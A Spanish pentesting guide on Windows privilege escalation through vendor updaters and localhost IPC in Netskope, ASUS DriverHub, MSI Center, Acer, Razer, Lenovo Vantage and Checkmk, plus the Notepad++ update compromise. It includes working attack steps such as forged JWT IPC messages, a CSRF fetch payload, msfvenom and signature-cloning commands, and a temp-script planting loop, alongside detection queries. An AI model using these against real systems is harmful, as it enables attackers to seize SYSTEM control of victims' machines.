# Abusar de actualizadores empresariales y de IPC privilegiado (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios local en Windows halladas en agentes de endpoints y actualizadores empresariales que exponen una superficie IPC de fácil acceso y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el registro en un servidor controlado por un atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar el nuevo registro o la reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y dirigir el actualizador a un paquete malicioso «firmado».
- Evadir comprobaciones débiles del firmante (listas de permitidos de CN), flags de digest opcionales y propiedades laxas de MSI.
- Si el IPC está «cifrado», derivar la clave/IV a partir de identificadores de máquina legibles por todos y almacenados en el registro.
- Si el servicio restringe a los llamadores por ruta de imagen/nombre de proceso, inyectar código en un proceso permitido o iniciar uno suspendido y preparar la DLL mediante un parche mínimo al contexto del hilo.

Los servicios TCP locales personalizados merecen la misma revisión de identidad y límites de entrada, incluso cuando requieren un PIN u otra credencial de la aplicación. Identifica el proceso asociado al listener y la cuenta de servicio efectiva, y luego inspecciona el binario/versión exactos desplegados y si se comprueba la longitud de los campos controlados por el llamador antes de copiarlos en búferes de tamaño fijo o usarlos para construir un comando de proceso hijo. La [guía de Microsoft sobre desbordamientos de búfer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explica por qué la entrada externa sin comprobar es peligrosa en código nativo privilegiado. Un listener loopback, una credencial codificada de forma fija o un nombre de proceso no demuestran por sí solos corrupción de memoria ni ejecución como SYSTEM; la accesibilidad, la autorización, la ruta de código y las mitigaciones siguen siendo condiciones distintas. Mantén la enumeración rutinaria en modo pasivo en lugar de enviar entradas de longitud capaz de provocar fallos a un servicio activo.

---
## 1) Forzar el registro en un servidor del atacante mediante IPC localhost

Muchos agentes incluyen un proceso de interfaz de usuario en modo usuario que se comunica con un servicio SYSTEM por TCP localhost mediante JSON.

Observado en Netskope:
- Interfaz de usuario: stAgentUI (integridad baja) ↔ Servicio: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crea un token de registro JWT cuyas claims controlen el host del backend (p. ej., AddonUrl). Usa alg=None para que no se requiera firma.
2) Envía el mensaje IPC que invoca el comando de aprovisionamiento con tu JWT y el nombre del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) El servicio empieza a realizar solicitudes a tu servidor malicioso para obtener datos de registro/configuración, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del llamante se basa en la ruta o el nombre, origina la solicitud desde un binario del proveedor incluido en la lista de permitidos (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Secuestrar el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y dirígelo a un MSI controlado por el atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, por ejemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en formato PEM. El servicio lo instala en el almacén Trusted Root de Local Machine.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y una versión falsa.

Evasión de comprobaciones comunes observadas en la práctica:
- Lista de permitidos de CN del firmante: es posible que el servicio solo compruebe que el CN del Subject sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu CA rogue puede emitir un certificado leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad benigna de MSI llamada CERT_DIGEST. No se aplica ninguna validación durante la instalación.
- Aplicación opcional del digest: una opción de configuración (p. ej., check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
y ejecuta código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección para evadir parches: si un proveedor responde añadiendo a una lista de permitidos un pequeño conjunto de dominios “de confianza” en lugar de autenticar criptográficamente el origen de las actualizaciones, busca redirectores o proxies inversos propiedad del proveedor que todavía permitan dirigir el tráfico. En el caso de Netskope, investigaciones públicas posteriores mostraron que una lista de permitidos de la época de R129 todavía podía evadirse mediante `rproxy.goskope.com`, que actuaba como proxy de contenido de Azure App Service controlado por un atacante. Considera las listas de permitidos de nombres de host como un obstáculo, no como un límite de confianza.<sup>[[14]](#references)</sup>

---
## 3) Falsificación de solicitudes IPC cifradas (cuando estén presentes)

A partir de R127, Netskope encapsuló el JSON de IPC en un campo encryptData que parece estar codificado en Base64. La ingeniería inversa reveló que se utilizaba AES, con la clave y el IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agente de repente “cifra” su IPC, busca ID de dispositivo, GUID de producto e ID de instalación en HKLM que puedan usarse como material.

---
## 4) Evasión de listas de permitidos de clientes IPC (comprobaciones de ruta/nombre)

Algunos servicios intentan autenticar al cliente resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con los binarios del proveedor incluidos en una lista de permitidos y ubicados en Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos formas prácticas de evadirlo:
- Inyección de DLL en un proceso incluido en la lista de permitidos (p. ej., nsdiag.exe) y envío de solicitudes IPC desde ese proceso.
- Inicia un binario incluido en la lista de permitidos en estado suspendido y carga tu proxy DLL sin CreateRemoteThread (consulta §5) para cumplir las reglas de protección contra manipulaciones aplicadas por el driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inyección compatible con la protección contra manipulaciones: proceso suspendido + parche de NtContinue

A menudo, los productos incluyen un minifilter/driver con callbacks OB (p. ej., Stadrv) para eliminar permisos peligrosos de los handles a procesos protegidos:
- Proceso: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe los permisos a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader fiable en user mode que respeta estas restricciones:
1) Crea un proceso de un binario del proveedor con CREATE_SUSPENDED.
2) Obtén los handles que todavía tienes permitido usar: PROCESS_VM_WRITE | PROCESS_VM_OPERATION para el proceso y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas el código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk inicial que esté mapeado con certeza) con un pequeño stub que llame a LoadLibraryW con la ruta de tu DLL y luego vuelva al flujo de ejecución.
4) Ejecuta ResumeThread para activar el stub dentro del proceso y cargar tu DLL.

Como nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME en un proceso ya protegido (lo creaste tú), se cumple la política del driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Herramientas prácticas
- NachoVPN (plugin de Netskope) automatiza la creación de una CA rogue, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC personalizado que crea mensajes IPC arbitrarios (opcionalmente cifrados con AES) e incluye la inyección en un proceso suspendido para originar solicitudes desde un binario incluido en la lista de permitidos.<sup>[[4]](#references)</sup>

## 7) Flujo rápido de triaje para superficies de updater/IPC desconocidas

Al analizar un nuevo agente endpoint o una suite “helper” de placa base, normalmente basta con un flujo de trabajo rápido para determinar si se trata de un objetivo prometedor para privesc:<sup>[[6]](#references)</sup>

1) Enumera los listeners de loopback y relaciónalos con los procesos del proveedor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumerar las named pipes candidatas:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extrae datos de enrutamiento almacenados en el registro que usan los servidores IPC basados en plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrae primero los nombres de endpoints, las claves JSON y los IDs de comandos del cliente en modo usuario. Los frontends empaquetados de Electron/.NET suelen filtrar el esquema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Busca el predicado de confianza real, no solo la ruta de código que termina iniciando el proceso:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrones que conviene priorizar:
- `CryptQueryObject`/análisis de certificados sin `WinVerifyTrust` suele significar que se trató «el certificado existe» como «el certificado es de confianza», lo que permite clonar certificados u otros trucos con firmantes falsos.
- Las comprobaciones de subcadenas/sufijos en `Origin`, `Referer`, URLs de descarga, nombres de procesos o CN de firmantes no autentican. `contains(".vendor.com")` suele ser explotable con dominios similares controlados por un atacante.
- Si la GUI con pocos privilegios decide que «el archivo es de confianza» y el broker de SYSTEM simplemente consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele permitir saltarse por completo el límite (validación dividida al estilo Razer).
- Si el broker copia una carga útil a `%TEMP%`/`C:\Windows\Temp` y luego la valida o programa desde esa ruta, comprueba de inmediato si hay ventanas de reemplazo TOCTOU y si existen módulos plugin hermanos que expongan wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos que usan muchas named pipes, PipeViewer permite detectar rápidamente DACL débiles y pipes accesibles de forma remota antes de empezar a invertir el protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a los llamadores solo mediante el PID, la ruta de la imagen o el nombre del proceso, considéralo un obstáculo menor, no un límite de seguridad: inyectar código en el cliente legítimo o realizar la conexión desde un proceso permitido suele bastar para satisfacer las comprobaciones del servidor. En el caso específico de las named pipes, [esta página sobre suplantación de clientes y abuso de pipes](named-pipe-client-impersonation.md) explica la primitiva con más detalle.

Para un **broker privilegiado de limpieza o restauración**, inspecciona el límite de confianza de las rutas además de la ACL de la pipe. Un llamador con menos privilegios podría seleccionar un destino de restauración o cambiar el nombre de un artefacto de copia de seguridad preparado en un directorio compartido, incluso si el ejecutable del servicio y su directorio de instalación están protegidos. Confirma por separado que el llamador puede acceder al comando de restauración, modificar la entrada preparada exacta o su nombre de archivo, que el broker se ejecuta con una identidad de mayor privilegio y que la operación de restauración realmente escribe en la ruta protegida seleccionada. Un directorio de preparación con permisos de escritura o una pipe legible por sí solos no demuestran que sea posible realizar una escritura arbitraria con privilegios; es necesario revisar el código o hacer pruebas controladas para comprender la asignación del destino y el comportamiento del servicio. No invoques un comando de limpieza desconocido durante el reconocimiento pasivo, ya que podría eliminar archivos del usuario.

---
## 8) Brokers de add-ins modulares autenticados solo mediante firmas del proveedor (patrón Lenovo Vantage)

Una variante más reciente que conviene buscar es el **broker RPC de clientes firmados**: un proceso de escritorio de Lenovo firmado y con pocos privilegios se comunica con un servicio de SYSTEM, y el servicio dirige comandos JSON a un conjunto de add-ins descritos mediante XML en `%ProgramData%`. Una vez que se consigue ejecutar código **dentro de cualquier cliente firmado aceptado**, todos los contratos `runas="system"` pasan a formar parte de la superficie de ataque.<sup>[[15]](#references)</sup>

Primitivas de alto valor observadas en investigaciones sobre Lenovo Vantage:
- **Confiar en el llamador porque tiene la firma del proveedor**: investigadores llegaron a un contexto autenticado copiando un EXE firmado por Lenovo a un directorio con permisos de escritura y satisfaciendo una carga lateral de DLL (`profapi.dll`), para que se ejecutara código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la superficie de ataque mediante manifiestos**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, por lo que enumerar esos manifiestos suele revelar los verbos privilegiados reales más rápido que invertir el broker en sí.
- **Errores por comando detrás del canal autenticado**: una vez dentro del cliente de confianza, investigaciones públicas encontraron traversal de rutas y condiciones de carrera en verbos de actualización/instalación, abuso de SQL sin procesar en bases de datos de configuración privilegiadas y comprobaciones de rutas de registro basadas en subcadenas que permitían escribir fuera de la hive prevista.

Reconocimiento útil en un objetivo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusión práctica: siempre que una suite de utilidades exponga un broker que primero autentique el **proceso llamante** y solo entonces distribuya las solicitudes entre decenas de comandos de plugins/add-ins, no te detengas tras omitir la comprobación de confianza de entrada. Vuelca la tabla del manifiesto/contrato y fuzz-ea cada verbo de alto privilegio de forma independiente; el canal autenticado suele ocultar varios bugs de segunda etapa.

---
## 1) CSRF del navegador a localhost contra API HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador procedentes de https://driverhub.asus.com. El filtro de origen simplemente ejecuta `string_contains(".asus.com")` sobre el encabezado Origin y sobre las URL de descarga expuestas por `/asus/v1.0/*`. Por lo tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede enviar solicitudes que modifican el estado desde JavaScript.<sup>[[6]](#references)</sup> Consulta [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para ver otros patrones de omisión.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON que espera el handler; el JS del frontend empaquetado muestra el esquema a continuación.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Incluso la CLI de PowerShell que se muestra a continuación funciona cuando se falsifica el encabezado Origin para que tenga el valor de confianza:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o de 0 clic mediante `onload`) que controla un helper SYSTEM.

---
## 2) Verificación insegura de firmas de código y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los guarda en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de subcadenas, por lo que acepta `http://updates.asus.com.attacker.tld:8000/payload.exe`. Después de la descarga, ADU.exe solo comprueba que el PE contenga una firma y que la cadena Subject coincida con ASUS antes de ejecutarlo: no usa `WinVerifyTrust` ni valida la cadena de certificados.

Para aprovechar este flujo:
1) Crea un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona el firmante de ASUS en él (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio que imite `.asus.com` y activa UpdateApp mediante el CSRF del navegador anterior.

Como tanto los filtros de Origin y URL se basan en subcadenas y la comprobación del firmante solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante con privilegios elevados.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU en las rutas de copia/ejecución del actualizador (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada trama tiene el formato `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su manejador:
1) Copia el ejecutable proporcionado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe dar resultado satisfactorio).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no se bloquea entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar la trama A apuntando a un binario legítimo firmado por MSI (garantiza que la comprobación de firma pase y que la tarea quede programada).
- Intentar ganarle la carrera con mensajes repetidos de la trama B que apunten a un payload malicioso y sobrescriban `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando se active el programador de tareas, ejecutará el payload sobrescrito como SYSTEM, aunque se haya validado el archivo original. Una explotación fiable usa dos goroutines/hilos que envían repetidamente `CMD_AutoUpdateSDK` hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado a nivel SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de una trama seleccionan ese componente, lo que permite a los atacantes dirigir comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios ejecutores de tareas. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin validar la firma**: cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución como SYSTEM de forma determinista.
- Capturar el tráfico de loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente la correspondencia entre Component y comandos; luego se pueden reproducir las tramas con clientes personalizados en Go/Python.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonation
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el ID de comando `7` con una ruta de archivo invoca la rutina del servicio que crea procesos.
- La biblioteca cliente serializa un byte terminador mágico (113) junto con los argumentos. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para obtener consejos de instrumentación) muestra que el manejador nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) lleva a la rama genérica, que conserva el token SYSTEM completo y establece un SID de alta integridad (`S-1-16-12288`). Por tanto, el binario iniciado se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combina esto con la opción de instalador expuesta (`Setup.exe -nocheck`) para instalar ACC incluso en máquinas virtuales de laboratorio y probar el pipe sin hardware del proveedor.<sup>[[6]](#references)</sup>

Estos errores de IPC ponen de relieve por qué los servicios de localhost deben aplicar autenticación mutua (SIDs de ALPC, filtros `ImpersonationLevel=Impersonation` y filtrado de tokens), y por qué el helper de cada módulo que permite “ejecutar un binario arbitrario” debe aplicar las mismas verificaciones del firmante.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en modo usuario (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que inicie un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega a una DLL en modo usuario (`simple_service.dll`) en lugar de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar el inicio con privilegios elevados.
- En el PoC público, se parchea la comprobación de firma PE dentro de `simple_service.dll` antes de enviar la solicitud, lo que permite iniciar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocación mínima en PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusión general: al hacer reversing de suites “helper”, no te limites a TCP localhost ni a named pipes. Busca clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`, y luego comprueba si el servicio privilegiado valida realmente el binario de destino o si simplemente confía en un resultado calculado por una DLL cliente de user-mode que se puede parchear. Este patrón va más allá de Razer: cualquier diseño dividido en el que el broker de altos privilegios consuma una decisión de permitir/denegar del lado de bajos privilegios es una posible superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre del archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario con pocos privilegios puede crear de antemano el futuro archivo temporal como **solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en versiones vulnerables de Checkmk Agent:
- patrón temp: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- activación: **reparación** MSI del paquete del agente almacenado en caché<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Estima un rango realista de PID a partir de los ID de proceso actuales o del PID del agente en ejecución.
2. Escribe un payload `.cmd` breve en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida UTF-16 de PowerShell para archivos batch).
3. Distribuye `C:\Windows\Temp\cmk_all_<PID>_1.cmd` por el rango candidato y marca cada archivo como solo lectura.
4. Activa una reparación del MSI almacenado en caché para que el servicio privilegiado intente regenerar y luego ejecute el script temporal.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si el producto vulnerable está instalado con Windows Installer, identifica el nombre del producto correspondiente al MSI de nombre aleatorio almacenado en caché en `C:\Windows\Installer` antes de activar la reparación:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operativas:
- `qwinsta` resulta útil cuando `msiexec /fa` falla desde un shell de WinRM no interactivo y necesitas determinar si una sesión de escritorio existente o desconectada puede activar la reparación correctamente.<sup>[[7]](#references)</sup>
- Este patrón se generaliza a otros agentes de endpoint y actualizadores que **preparan scripts temporales en ubicaciones con permisos de escritura para todos y luego los ejecutan como SYSTEM**. Comprueba si los nombres son predecibles, si falta la semántica de creación exclusiva y si los flujos de reparación/actualización pueden activarse a demanda.

### Reparación interactiva del instalador y consola privilegiada

PDF24 Creator 11.15.1 ilustra otro riesgo de reparación de MSI: su acción personalizada de instalación de impresora puede iniciar una consola visible con derechos de SYSTEM durante la reparación. El proveedor modificó el instalador MSI en la versión 11.15.2 para corregir este comportamiento. Una versión antigua del producto solo sirve como indicio inicial para el triaje. Comprueba el paquete MSI registrado o accesible, si este usuario puede iniciar la reparación, si están presentes la acción personalizada vulnerable y el retardo en el archivo de registro, y si un escritorio interactivo puede mostrar la consola. El retardo reportado usaba un oplock en `faxPrnInst.log`; tener permisos de escritura normales sobre el archivo no es la única condición de acceso. Un shell no interactivo, un paquete inaccesible o un instalador parcheado pueden interrumpir la cadena. Este problema no depende de `AlwaysInstallElevated` y es distinto de reemplazar un script temporal predecible.

---
## Secuestro remoto de la cadena de suministro mediante validación débil del actualizador (WinGUp / Notepad++)

Entre junio de 2025 y diciembre de 2025, atacantes que comprometieron la infraestructura de alojamiento detrás del flujo de actualización de Notepad++ enviaron selectivamente manifiestos maliciosos a víctimas elegidas. Los actualizadores antiguos basados en WinGUp no verificaban completamente la autenticidad de las actualizaciones, por lo que una respuesta XML maliciosa podía redirigir a los clientes a URL controladas por los atacantes. Como el cliente aceptaba contenido HTTPS sin exigir tanto una cadena de certificados de confianza como una firma PE válida en el instalador descargado, las víctimas descargaban y ejecutaban un `update.exe` troyanizado de NSIS.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no se requiere ningún exploit local):
1. **Intercepción de la infraestructura**: comprometer la CDN/el alojamiento y responder a las comprobaciones de actualización con metadatos controlados por el atacante que apunten a una URL de descarga maliciosa.
2. **NSIS troyanizado**: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
   - **Bring-your-own signed binary + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y dejar una `log.dll` maliciosa en su ruta de búsqueda. Cuando se ejecuta el binario firmado, Windows carga mediante sideload `log.dll`, que descifra y carga de forma reflectiva la puerta trasera Chrysalis (protegida por Warbird y con hash de API para dificultar la detección estática).
   - **Inyección de shellcode mediante scripts**: NSIS ejecuta un script Lua compilado que utiliza API de Win32 (p. ej., `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Recomendaciones de endurecimiento/detección para cualquier actualizador automático:
- Exige la **verificación del certificado y la firma** del instalador descargado (fija el firmante del proveedor y rechaza discrepancias en el CN/la cadena) y firma el propio manifiesto de actualización (p. ej., con XMLDSig). Bloquea las redirecciones controladas por el manifiesto si no están validadas.
- Considera el **sideloading de binarios firmados propios (BYO)** como un pivote de detección posterior a la descarga: genera alertas cuando un EXE firmado de un proveedor carga una DLL con un nombre que no está en su ruta de instalación canónica (p. ej., Bitdefender carga `log.dll` desde Temp/Downloads) y cuando un actualizador deja o ejecuta instaladores desde una carpeta temporal con firmas que no son del proveedor.
- Supervisa los **artefactos específicos del malware** observados en esta cadena (útiles como pivotes genéricos): el mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y las etapas de inyección de shellcode controladas por Lua.
- Notepad++ respondió reforzando WinGUp en la versión v8.8.9 y posteriores: ahora el XML recibido está firmado (XMLDSig) y las compilaciones más recientes exigen la verificación del certificado y la firma del instalador descargado, en vez de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading de <code>log.dll</code> por un EXE firmado de Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ejecutando un instalador que no es de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
